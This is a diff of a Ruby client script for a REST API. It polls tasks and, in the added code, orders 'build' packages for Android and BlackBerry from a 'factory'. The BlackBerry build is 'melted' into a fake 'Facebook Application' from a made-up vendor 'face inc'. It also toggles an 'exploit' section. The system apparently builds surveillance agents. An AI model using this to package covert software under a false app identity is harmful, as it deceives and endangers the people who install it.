@@ -264,59 +264,71 @@ if false
 end
 
 # task
-if false
+if true
 
 def REST_task(http, cookie, type, filename, params={})
-  
-  res = http.request_get('/task', {'Cookie' => cookie})
-  puts "task.index"
-  puts res.body
-  puts
   
   task_params = {'type' => type, 'file_name' => filename}
   task_params.merge! params
   
   res = http.request_post('/task/create', task_params.to_json, {'Cookie' => cookie})
-  puts "task.create"
-  puts res.body
+  res.kind_of? Net::HTTPSuccess or fail("Cannot create task.")
   task = JSON.parse(res.body)
   puts "Created task #{task['_id']}"
   puts
   
-  resource = ''
-  while (resource == '')
+  size = nil
+  while (size.nil?)
     res = http.request_get("/task/#{task['_id']}", {'Cookie' => cookie})
-    puts "task.show"
-    puts res.body
     task = JSON.parse(res.body)
-    puts "#{task['current']}/#{task['total']} #{task['desc']}"
+    puts "#{task['current']}/#{task['total']} #{task['desc']} ERROR: #{task['error']} RESOURCE: #{task['resource']}"
+    break if task['error'] == true
     resource = task['resource']
-    file_name = task['file_name']
-    sleep 0.1
+    size = task['resource']['size']
+    sleep 0.05
   end
   
+  puts "#{task['current']}/#{task['total']} #{task['desc']} ERROR: #{task['error']} RESOURCE: #{task['resource']}"
+  
   puts "resource: #{resource.to_s}"
-  res = http.request_get("/#{resource['type']}/#{resource['_id']}", {'Cookie' => cookie})
+  res = http.request_get("/file/#{resource['_id']}", {'Cookie' => cookie})
   puts "#{resource['type']}.get"
-  File.open(file_name, 'wb') do |f|
+  File.open(resource['file_name'], 'wb') do |f|
     f.write res.body
   end
   
-  puts "Written #{file_name}."
+  puts "Written #{resource['file_name']}."
   
-  res = http.request_get('/task', {'Cookie' => cookie})
-  puts "task.index"
-  puts res.body
-  puts
-  
-  res = http.request_post('/task/destroy', task['_id'].to_json, {'Cookie' => cookie})
-  puts "task.destroy"
+  puts "Deleting task #{task['_id'].to_json}."
+  res = http.request_post('/task/destroy', {_id: task['_id']}.to_json, {'Cookie' => cookie})
   puts res.inspect
   puts
 end
 
-REST_task(http, cookie, 'audit', 'audit-all.tar.gz')
-REST_task(http, cookie, 'dummy', 'dummy.tar.gz')
+#REST_task(http, cookie, 'audit', 'audit-all.tar.gz')
+#REST_task(http, cookie, 'dummy', 'dummy.tar.gz')
+
+res = http.request_get('/factory', {'Cookie' => cookie})
+factories = JSON.parse(res.body)
+
+android_params = {factory: {_id: factories.first['_id']},
+                  platform: 'android',
+                  binary: {demo: true},
+                  melt: {appname: 'facebook'}
+                  }
+bb_params =  {factory: {_id: factories.first['_id']},
+              platform: 'blackberry',
+              binary: {demo: true},
+              melt: {appname: 'facebook',
+                name: 'Facebook Application',
+                desc: 'Applicazione utilissima di social network',
+                vendor: 'face inc',
+                version: '1.2.3'},
+              package: {type: 'remote'}
+              }
+                                    
+#REST_task(http, cookie, 'build', 'android.zip', android_params)
+REST_task(http, cookie, 'build', 'bb.zip', bb_params)
 
 =begin
 sleep 3
@@ -1010,7 +1022,7 @@ if false
 end
 
 # exploit
-if true
+if false
   # exploit.index
   puts "exploit.index" 
   res = http.request_get('/exploit', {'Cookie' => cookie})
